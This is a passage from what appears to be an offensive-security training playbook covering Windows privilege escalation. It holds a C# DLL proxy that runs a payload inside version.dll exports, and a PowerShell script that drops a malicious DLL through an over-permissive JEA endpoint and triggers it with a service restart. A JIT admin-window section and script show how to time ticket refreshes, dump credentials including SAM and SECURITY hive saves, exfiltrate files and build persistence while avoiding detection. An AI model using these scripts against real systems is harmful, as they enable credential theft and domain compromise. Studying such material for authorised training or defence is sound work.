        [DllExport("GetFileVersionInfoSizeW", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeW(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeWDelegate real = Resolve<GetFileVersionInfoSizeWDelegate>("GetFileVersionInfoSizeW");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("GetFileVersionInfoSizeA", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeA(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeADelegate real = Resolve<GetFileVersionInfoSizeADelegate>("GetFileVersionInfoSizeA");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("VerQueryValueW", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueW(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueWDelegate real = Resolve<VerQueryValueWDelegate>("VerQueryValueW");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }

        [DllExport("VerQueryValueA", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueA(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueADelegate real = Resolve<VerQueryValueADelegate>("VerQueryValueA");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }
    }
}
````

#### `m14-jea-file-copy.ps1` {#m14-jea-file-copy-ps1}

````powershell
<#
Purpose: automate the "JEA over-permissive file copy" exploit - connect to the restricted JEA endpoint, enumerate the available commands, harmlessly probe the boundary,
      drop a malicious DLL into a service load directory, and try to trigger the load with Restart-Service.
Scenario: scenario 42 (docs/14-kiosk-jea-jit.md). The role capability is too broad: it allows Copy-Item and -Destination
      is not restricted to safe directories; this script does not rely on executing arbitrary code inside the session.
Requires: PowerShell 5.1+ on the attacker machine; WinRM 5985/5986 open on the target; a JEA endpoint whose Permission includes this account;
      the DLL that gets dropped is in m14-jea-service-dll.cs (or the M04 native C template).
Usage:
  .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEAendpoint name> -Domain DOMAIN -User USER `
      -Pass 'PASS' -LocalPayload .\evil.dll -RemoteDir 'C:\Program Files\<Vendor>' `
      -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
  Notes: -ProbeOnly only does two things - "enumerate the commands + write a harmless probe" - and does not drop the real payload; use it to confirm the boundary.
       NTHASH logon is not supported over a direct native WinRM connection; see the -NTHash parameter notes.
Placeholders: LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD - all passed in as command-line parameters.
Test status: not tested (depends on the target's JEA configuration; per section 42 of the doc, verify the boundary under -ProbeOnly first).
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$Target,      # target host name/IP (TARGET)
    [Parameter(Mandatory)][string]$Endpoint,    # JEA session configuration name, such as BackupMaintenance
    [Parameter(Mandatory)][string]$Domain,      # domain name (DOMAIN)
    [Parameter(Mandatory)][string]$User,        # JEA role member account (USER)
    [string]$Pass,                              # cleartext password (PASS); mutually exclusive with -NTHash
    [string]$NTHash,                            # NTHASH: informational only (WinRM does not support direct hash logon)
    [string]$LocalPayload,                      # local malicious DLL path (PAYLOAD)
    [string]$RemoteDir,                         # target delivery directory (service exe/plug-in directory)
    [string]$RemoteName,                        # file name after delivery (the dependency name the host is missing)
    [string]$ServiceName,                       # service to restart as the trigger
    [switch]$ForceRestart,                      # call Restart-Service after delivery
    [switch]$ProbeOnly                          # probe the boundary only; do not drop the real payload
)

$ErrorActionPreference = 'Stop'

function New-DomainCred {
    param([string]$Account, [string]$Password)
    $secure = ConvertTo-SecureString $Password -AsPlainText -Force
    New-Object System.Management.Automation.PSCredential($Account, $secure)
}

function Write-Step {
    param([string]$Message, [ConsoleColor]$Color = 'Gray')
    Write-Host ("[+] " + $Message) -ForegroundColor $Color
}

# ---- 0. Parameter check ----
if (-not $Pass) {
    if ($NTHash) {
        Write-Warning "WinRM/JEA native login does not support direct transmission of NTHASH. Alternative:"
        Write-Warning "1) Use m15’s evil-winrm idea with hashing (evil-winrm supports NTLM hashing);"
        Write-Warning "2) First exchange NTHASH for tickets/exchange plaintext (such as Rubeus asktgt + s4u and then use Kerberos)."
        Write-Warning "This script requires -Pass clear text password for New-PSSession."
        exit 1
    }
    throw "-Pass (clear text password) is missing."
}
if (-not $ProbeOnly -and (-not $LocalPayload -or -not $RemoteDir -or -not $RemoteName)) {
    throw "-LocalPayload, -RemoteDir, -RemoteName must be provided in non-ProbeOnly mode."
}

$account = "$Domain\$User"
$cred = New-DomainCred -Account $account -Password $Pass

# ---- 1. Establish JEA session ----
Write-Step "Connect to JEA endpoint: $Target / $Endpoint (account $account)" 'Cyan'
$session = $null
try {
    $session = New-PSSession -ComputerName $Target -ConfigurationName $Endpoint `
        -Credential $cred -ErrorAction Stop
}
catch {
    Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor 'Red'
    Write-Host "Check: whether the endpoint name/account is in the Permission of the endpoint/whether WinRM is reachable/whether HTTPS is required."
    exit 1
}

# ---- 2. Enumerate the commands available in the session (what you can see is what can be used) ----
Write-Step "Enumerate available commands within a session:" 
$allowed = Invoke-Command -Session $session -ScriptBlock {
    Get-Command | Select-Object Name, CommandType, Source | Sort-Object Name
}
$allowed | Format-Table -AutoSize | Out-String | Write-Host
$hasCopy   = [bool]($allowed | Where-Object { $_.Name -eq 'Copy-Item' })
$hasRestart = [bool]($allowed | Where-Object { $_.Name -eq 'Restart-Service' })
$hasStop    = [bool]($allowed | Where-Object { $_.Name -eq 'Stop-Service' })
$hasStart   = [bool]($allowed | Where-Object { $_.Name -eq 'Start-Service' })

if (-not $hasCopy) {
    Write-Host "[!] There is no Copy-Item in the session - this endpoint capability is not applicable to this attack, exit." -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 3. The harmless probe is written to the target directory ----
$probe = "m14probe_$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"
Write-Step "Probe the boundary: Copy-Item probe -> $RemoteDir\$probe"
$probeOk = $false
try {
    Invoke-Command -Session $session -ScriptBlock {
        param($dir, $file)
        Set-Content -Path (Join-Path $dir $file) -Value "m14 probe" -ErrorAction Stop
    } -ArgumentList $RemoteDir, $probe
    $probeOk = $true
    Write-Step "Probe writing successful: $RemoteDir\$probe (directory is within replication capability)" 'Green'
}
catch {
    Write-Host "[!] Probe writing failed: $($_.Exception.Message)" -ForegroundColor 'Yellow'
    Write-Host "The directory may be excluded or unwritable, change the directory and try again; or read the role capability .psrc to find the allowed path."
}

if ($ProbeOnly) {
    Write-Step "ProbeOnly: That’s it. The probe can be cleaned up (if the session allows Remove-Item), otherwise the recorded path will be processed afterwards."
    Remove-PSSession $session
    exit 0
}
if (-not $probeOk) {
    Write-Host "[!] Boundary detection failed, the payload was not delivered, and exited. Rerunable -ProbeOnly troubleshooting." -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 4. Deliver malicious DLL ----
Write-Step "Deliver payload: $LocalPayload -> $RemoteDir\$RemoteName"
if (-not (Test-Path $LocalPayload)) { throw "Local payload does not exist: $LocalPayload" }
try {
    $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $LocalPayload))
    Invoke-Command -Session $session -ScriptBlock {
        param($dir, $name, $data)
        [System.IO.File]::WriteAllBytes((Join-Path $dir $name), $data)
    } -ArgumentList $RemoteDir, $RemoteName, $bytes
    Write-Step "DLL written: $RemoteDir\$RemoteName (waiting for trigger)" 'Green'
}
catch {
    Write-Host "[!] Delivery failed: $($_.Exception.Message)" -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 5. Trigger loading ----
if ($ServiceName -and ($ForceRestart -or $hasRestart -or $hasStop)) {
    Write-Step "Trigger: Restart/start/stop service $ServiceName"
    try {
        if ($hasRestart) {
            Invoke-Command -Session $session -ScriptBlock {
                param($svc) Restart-Service -Name $svc -Force -ErrorAction Stop
            } -ArgumentList $ServiceName
        }
        elseif ($hasStop -and $hasStart) {
            Invoke-Command -Session $session -ScriptBlock {
                param($svc) Stop-Service -Name $svc -Force; Start-Service -Name $svc
            } -ArgumentList $ServiceName
        }
        Write-Step "The service has been restarted and the DLL should have been loaded (reconnect window 30–60s)" 'Green'
    }
    catch {
        Write-Host "[!] Service triggering failed: $($_.Exception.Message)" -ForegroundColor 'Yellow'
        Write-Host "Alternative: Wait for automatic restart/administrator restart; or change to event triggering (login script/scheduled task/Startup) according to the document."
    }
}
else {
    Write-Step "No service control command or -ForceRestart is not specified: Wait for the service to automatically restart/trigger by the administrator (keep listening)."
}

Write-Step "Finish. If the DLL is reconnected successfully, please check whoami (should be the service account); remember to restore the overwritten files."
Remove-PSSession $session
````

## Scenario 43 · JIT time window (authorization state / token refresh lag / planned commands inside the window)

### Situation
The environment applies just-in-time (JIT) admin rights: normally the privileged group (for example the domain group `JIT-Admins`, or the target's local Administrators group) does **not** contain the target account; when an administrator needs it, the account is added temporarily and removed again minutes to tens of minutes later. We hold credentials for a low-privilege account that may be JIT-authorized (or we can take over an account that will be authorized). Task: use the **time window** to obtain a privileged result. Three things matter: ① you can query the authorization state (when the window opens and closes); ② you understand the token refresh lag ("the group was added" does not mean "the existing session takes effect immediately", and conversely "the group was removed" does not mean "issued tickets stop working at once"); ③ the **privileged commands to run inside the window are planned in advance**, so they run the moment the window opens - you cannot improvise on site.

### Assumptions
- You hold credentials for a low-privilege account that will be JIT-authorized, or you can take over the account that gets authorized first.
- At least one way to "watch the window": you can read AD (LDAP group membership queries), or read the domain controller/local security log (4728/4729: member added/removed), or the environment documentation states the JIT activation rule and duration.
- Kerberos is the primary authentication: TGTs and service tickets have a lifetime, and **the group SIDs are only baked into the ticket issued at that moment** - that is the root cause that makes the lag exploitable.
- The attacker machine and the domain controller have synchronized clocks (a hard Kerberos requirement).

### Prepare (attacker side)
- Pre-plan the in-window command list and put it in order (see Procedure step 4), because the window may only be a few minutes long.
- Prepare the listener plus any persistence or collection scripts you need on disk.
- Record the expected JIT window start/end and your polling start point, so you can reconstruct it later.

### Procedure
1. **Decide how you will query the "authorization state"** (run these in parallel where possible):
   - AD group membership (the most common, readable by any domain user): poll `Get-ADGroupMember -Identity 'JIT-Admins' -Server DC`; without the AD module use ADSI (see the script implementation).
   - Event log: domain controller security log events **4728** (member added to a global group) / **4729** (removed); filter on the target account's SID.
   - Local JIT (temporary membership of the local Administrators group): poll `net localgroup Administrators` on the controlled host.
2. **Understand and actually measure the "token refresh lag"**:
   - **On the way in**: an old session or token that existed before the window does not contain the newly added group SID (`whoami /groups` will not show it) - you must **obtain a new token inside the window**: log on again, `runas`, open a new PSSession (which triggers a new network logon → a new TGT carrying the current group SIDs), or `klist purge` and then re-acquire tickets.
   - **On the way out**: a Kerberos ticket issued inside the window has a lifetime (default TGT 10h, renewable up to 7 days) **longer than the group membership** - after the group is removed, the privileged SID in the ticket stays valid until the ticket expires or is revoked. Renewal only extends the time; it does not change the SID set.
3. **Deploy window monitoring**: poll the authorization state in the background (`m14-jit-admin-window.ps1`). The moment it detects the window opening:
   a. obtain a new token (new PSSession / runas / re-authenticate to the target machine);
   b. verify the new token contains the privileged group: `whoami /groups | findstr JIT` inside the session;
   c. run the pre-planned command list in order.
4. **The planned command list for inside the window** (pre-ordered, each entry as short as possible):
   1) Collect local/domain privileged credentials and send them back (Invoke-Mimikatz and similar; see M07) - the results land on the attacker machine and stay usable after the window closes;
   2) Read files and configuration that need high privilege (scripts, backups, the registry) and exfiltrate them;
   3) (Optional, put last) Build persistence: a scheduled task/service, or adding our account to a long-lived group - actions that change the environment need separate confirmation and an audit-risk assessment.
   Principle: **get results first, talk persistence later**; any ticket/hash/remote session you obtain is an asset that keeps working after the window.
5. **Exploitation after the window closes**: once polling shows the membership removed (window closed), verify whether the residual session/ticket still carries the privileged SID (an existing PSSession's token is a logon snapshot and should still contain the group); finish your lateral movement within the ticket lifetime instead of relying on the group membership itself.

### Scripts used
- `m14-jit-admin-window.ps1`: polls the authorization state (ADSI group membership queries by default, with optional local-group/event-log modes) → grabs a new token as soon as the window opens → runs the pre-planned command list → records the window-close time and checks the residual token state.

### Validation
- The script log reads in the right order: window entry detected → new token contains the JIT group → every command in the list succeeds → window exit detected → residual token check result.
- Three-state validation: inside the window the new token's `whoami /groups` contains the privileged group; outside the window an old process token does not; a PSSession established inside the window still works after it closes (logon snapshot).
- The list's artifacts (hash files/collected output/ticket files) are confirmed present on the attacker machine.

### Failure branches and alternatives
- **Group membership/event log unreadable**: camp on the JIT activation time from the environment documentation and, around the expected window start, try obtaining a new token at high frequency and validate it with `whoami /groups` (brute-forcing the window start); or observe the administrator's pattern when they trigger authorization to infer the time.
- **The authorized object is not an account we control**: take over/reuse the JIT-authorized account first (credentials, session, token), then return to this flow.
- **Residual tickets die immediately after the window closes** (JIT configured with a short TGT or forced logoff): give up on post-window use and concentrate your output inside the window (callback/exfiltration first).
- **The privileged group only takes effect for a "new interactive logon", but the environment forbids multiple sessions/runas**: inside the window use S4U to request a service ticket directly (the Rubeus `s4u`/`asktgt` approach) to bypass the interactive-logon restriction and bake the privileged SID into a usable ticket.

### Exam / OPSEC notes
- Polling the authorization state is a low-risk read, but high-frequency polling leaves a lot of LDAP query logs: keep the interval at ≥5-10s and only increase the rate around the expected window.
- For event log queries (4728/4729), query the domain controller only; do not sweep multiple machines.
- Collecting credentials/building persistence inside the window is recorded in the JIT session audit: prioritize "getting results" (dumping hashes, exfiltrating files) inside the window, keep environment-changing actions to a minimum and put them last.
- Do not run residual tickets right up to the second before they expire (a failed renewal or a revocation is hard to clean up on site); once you have validated that it works, move to real exploitation and get the loot out quickly.

#### `m14-jit-admin-window.ps1` {#m14-jit-admin-window-ps1}

````powershell
<#
Purpose: combat script for a temporary JIT admin window - query the authorization state (AD group membership + the current token's groups), refresh tickets (klist purge / gpupdate),
      run the "pre-planned command list" in order inside the countdown window, and when the window closes check whether the residual token still carries the privileged SID.
Scenario: 43 (temporary JIT admin rights are approved, but stay valid for only a short time)
Requires: Windows PowerShell 3.0+; readable LDAP (389) in the domain or Get-ADGroupMember available; gpupdate / klist (built into Windows)
Usage:
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status -Domain DOMAIN -User USER -Group 'JIT-Admins'
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Refresh
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Wait -WindowSec 900 -PollSeconds 10
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Run -CommandFile C:\Users\public\jit-cmds.txt -WindowSec 300
Placeholders: DOMAIN=AD domain name; USER=the account that will be JIT-authorized; TARGET=target machine; PAYLOAD=the planned command list file (one command per line)
Test status: not measured on Windows; written for PowerShell 3.0+ syntax (use Get-Help .\m14-jit-admin-window.ps1 -Full for the instructions)
#>
[CmdletBinding()]
param(
    [ValidateSet('Status', 'Refresh', 'Wait', 'Run')]
    [string]$Mode = 'Status',

    [string]$Domain = 'DOMAIN',
    [string]$User = 'USER',
    [string]$Group = 'JIT-Admins',
    [string]$Computer = 'TARGET',

    [string]$CommandFile = 'PAYLOAD',
    [int]$WindowSec = 300,
    [int]$PollSeconds = 15,
    [int]$DeadlineSec = 1800,

    [string]$LogFile = (Join-Path $env:TEMP 'm14-jit-admin-window.log'),
    [switch]$Help
)

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Output $line
    try { Add-Content -Path $LogFile -Value $line -ErrorAction Stop } catch { }
}

function Get-TokenGroups {
    $out = & whoami /groups 2>$null
    if (-not $out) { $out = @() }
    return $out
}

function Test-TokenHasGroup {
    param([string]$GroupName)
    $groups = Get-TokenGroups
    if (-not $groups) { return $false }
    return [bool]($groups | Select-String -Pattern ([regex]::Escape($GroupName)) -SimpleMatch:$false)
}

# Use ADSI to read group members (readable by any domain user, no AD module required); if failed, return to net group
function Test-GroupMembership {
    param([string]$DomainName, [string]$UserName, [string]$GroupName)

    try {
        $root = [ADSI]"LDAP://$DomainName"
        $gs = New-Object System.DirectoryServices.DirectorySearcher($root)
        $gs.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        [void]$gs.PropertiesToLoad.Add('member')
        $g = $gs.FindOne()
        if (-not $g) { Write-Log "LDAP group not found: $GroupName" 'WARN'; return $null }

        $us = New-Object System.DirectoryServices.DirectorySearcher($root)
        $us.Filter = "(&(objectCategory=user)(sAMAccountName=$UserName))"
        [void]$us.PropertiesToLoad.Add('distinguishedName')
        $u = $us.FindOne()
        if (-not $u) { Write-Log "LDAP not found user: $UserName" 'WARN'; return $null }

        $userDn = [string]$u.Properties['distinguishedname'][0]
        $members = @($g.Properties['member'])
        $inGroup = ($members -contains $userDn)
        Write-Log ("AD group membership determination: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
        return $inGroup
    } catch {
        Write-Log ("ADSI query failed and returned to net group: {0}" -f $_.Exception.Message) 'WARN'
        try {
            $raw = & net group "$GroupName" /domain 2>$null
            $inGroup = [bool]($raw | Select-String -Pattern ("\b" + [regex]::Escape($UserName) + "\b"))
            Write-Log ("net group judgment: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
            return $inGroup
        } catch {
            Write-Log "Group membership query not available (both LDAP and net group failed)" 'WARN'
            return $null
        }
    }
}

function Get-JitAuthStatus {
    Write-Log '=== Authorization status ==='
    Write-Log ("Current status:" + (& whoami))
    Write-Log ("Target machine:" + $Computer)

    $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
    if ($inGroup -eq $true) { Write-Log "[IN ] Group members: Already in $Group (authorization approved)" }
    elseif ($inGroup -eq $false) { Write-Log "[OUT] Group member: Not in $Group (not authorized yet or has expired)" }
    else { Write-Log "[??] Group members: Unable to determine" }

    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log "[IN ] Current token: already contains $Group (can be used directly with high authority)" }
    else { Write-Log "[OUT] Current token: does not contain $Group (the old token does not contain the newly added group SID, a new token is required)" }

    Write-Log '=== Kerberos Tickets ==='
    try { & klist 2>$null | ForEach-Object { Write-Log ("  " + $_) } }
    catch { Write-Log 'klist is not available' 'WARN' }

    Write-Log '=== Security log 4728/4729 (member addition/removal) ==='
    try {
        $events = Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4728, 4729; StartTime = (Get-Date).AddHours(-6) } -MaxEvents 20 -ErrorAction Stop
        foreach ($e in $events) {
            $msg = ($e.Message -split "`r?`n") | Where-Object { $_ -match 'Member|Account|Group' } | Select-Object -First 3
            Write-Log ("  {0} id={1} {2}" -f $e.TimeCreated, $e.Id, ($msg -join ' | '))
        }
        if (-not $events) { Write-Log 'No 4728/4729 in the past 6 hours (may not be checked on the domain controller)' }
    } catch {
        Write-Log ('Event log reading failed (need to check on the local administrator or domain controller):' + $_.Exception.Message) 'WARN'
    }
}

# Refresh tickets: group members change ≠ existing tokens change immediately, and tickets must be obtained again
function Invoke-TokenRefresh {
    Write-Log '=== Refresh authentication status ==='
    Write-Log 'Step 1: klist purge (clear old TGT/service tickets and force re-application next time)'
    & klist purge 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log 'Step 2: gpupdate /force (pull new group policy/group members)'
    & gpupdate /force 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log 'Step 3: Trigger a network login to get a new token (new PSSession / new runas / re-authentication to the target machine)'
    Write-Log ("Suggestion: Enter-PSSession -ComputerName $Computer or runas /user:$Domain\$User cmd.exe")

    Write-Log 'Step 4: Review the new token'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] The new token already contains a high-privilege group and can start executing specified commands.' }
    else { Write-Log '[-] The new token still does not contain the high authority group: confirm whether the authorization is effective and whether the ticket has been re-issued' 'WARN' }
    return $inToken
}

function Invoke-PlannedCommands {
    param([string]$File, [int]$WindowSeconds)

    if (-not (Test-Path $File)) {
        Write-Log "Command list not found: $File" 'WARN'
        Write-Log 'The recommended command in the window (get the results first, then talk about persistence), write one line per line into the file:'
        Write-Log '  whoami /groups | findstr /I "JIT"'
        Write-Log '  reg save HKLM\SAM C:\Users\Public\sam.save /y'
        Write-Log '  reg save HKLM\SECURITY C:\Users\Public\sec.save /y'
        Write-Log '  nltest /domain_trusts'
        return
    }

    $deadline = (Get-Date).AddSeconds($WindowSeconds)
    $cmds = Get-Content -Path $File | Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') }
    Write-Log ("=== Execute {0} scheduled commands within the window (remaining window {1} seconds) ===" -f $cmds.Count, $WindowSeconds)

    foreach ($c in $cmds) {
        $left = [int]($deadline - (Get-Date)).TotalSeconds
        if ($left -le 0) { Write-Log 'The window has expired, stop executing remaining commands' 'WARN'; break }
        Write-Log ("[{0}s remaining] Execution: {1}" -f $left, $c)
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            $out = Invoke-Expression -Command $c 2>&1 | Out-String
            $sw.Stop()
            Write-Log ("Complete({0:N1}s) output: {1}" -f $sw.Elapsed.TotalSeconds, ($out.Trim() -replace "`r?`n", ' / '))
        } catch {
            $sw.Stop()
            Write-Log ("Failure({0:N1}s): {1}" -f $sw.Elapsed.TotalSeconds, $_.Exception.Message) 'ERROR'
        }
    }
    Write-Log 'The action in the window is completed'
}

function Start-JitCountdown {
    param([int]$Seconds)
    Write-Log ("Countdown {0} seconds (dot every 10 seconds; window is short, don’t think about commands on the spot)" -f $Seconds)
    $end = (Get-Date).AddSeconds($Seconds)
    $next = (Get-Date).AddSeconds(10)
    while ((Get-Date) -lt $end) {
        Start-Sleep -Seconds 1
        if ((Get-Date) -ge $next) {
            $left = [int]($end - (Get-Date)).TotalSeconds
            if ($left -gt 0) { Write-Log ("...{0} seconds remaining" -f $left) }
            $next = (Get-Date).AddSeconds(10)
        }
    }
    Write-Log 'Countdown ends: Check the remaining tokens after exiting the window'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] The residual token still contains a high-rights group: the ticket life cycle is longer than the group membership and can continue horizontally (do not use it until one second before expiration)' }
    else { Write-Log '[-] The remaining tokens no longer contain high-power groups: no reusable assets were obtained within the window, and the rescheduling plan was rolled back' 'WARN' }
}

function Start-JitWait {
    param([int]$Timeout, [int]$Interval)
    Write-Log ("Polling to wait for authorization to enter the window (up to {0} seconds, once every {1} seconds; interval ≥5-10s to avoid flushing LDAP logs)" -f $Timeout, $Interval)
    $deadline = (Get-Date).AddSeconds($Timeout)
    while ((Get-Date) -lt $deadline) {
        $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
        if ($inGroup -eq $true) {
            Write-Log '[+] When a window entry is detected, the ticket will be refreshed immediately and the specified command will be executed.'
            if (Invoke-TokenRefresh) {
                Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
                Start-JitCountdown -Seconds $WindowSec
            }
            return
        }
        Write-Log ("[*] {0} has not entered the window yet, waiting..." -f (Get-Date -Format 'HH:mm:ss'))
        Start-Sleep -Seconds $Interval
    }
    Write-Log '[-] Timeout: No window entry detected (check JIT activation time, or use event log 4728 to observe instead)' 'WARN'
}

if ($Help) {
    Write-Output @'
Usage: powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode <Status|Refresh|Wait|Run> [parameters]

  -Mode Status    query the authorization state: AD group membership, whether the current token contains the privileged group, klist tickets, security log 4728/4729
  -Mode Refresh   refresh the authentication state: klist purge -> gpupdate /force -> new logon to get a new token -> re-check
  -Mode Wait      poll and wait for the window (-DeadlineSec); on entry refresh tickets, run -CommandFile, count down and check the residual token
  -Mode Run       assume you are already inside the window: refresh -> re-check -> run the planned command list within -WindowSec seconds

  -Domain DOMAIN        AD domain name      -User USER      account that will be JIT-authorized
  -Group 'JIT-Admins'   privileged group name     -Computer TARGET target machine
  -CommandFile PAYLOAD  planned in-window command list (one per line, # starts a comment)
  -WindowSec 300        time budget for in-window actions    -DeadlineSec 1800  total polling time for Wait mode
'@
    exit 0
}

Write-Log ("=== m14-jit-admin-window startup: Mode={0} Domain={1} User={2} Group={3} ===" -f $Mode, $Domain, $User, $Group)

switch ($Mode) {
    'Status'  { Get-JitAuthStatus }
    'Refresh' { [void](Invoke-TokenRefresh) }
    'Wait'    { Start-JitWait -Timeout $DeadlineSec -Interval $PollSeconds }
    'Run'     {
        if (Invoke-TokenRefresh) {
            Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
            Start-JitCountdown -Seconds $WindowSec
        } else {
            Write-Log 'After the token is refreshed, it still does not contain the high-privilege group: first confirm the authorization status (-Mode Status) before executing, do not try and make mistakes in the window' 'ERROR'
        }
    }
}

Write-Log ("=== End, log position: {0} ===" -f $LogFile)
````

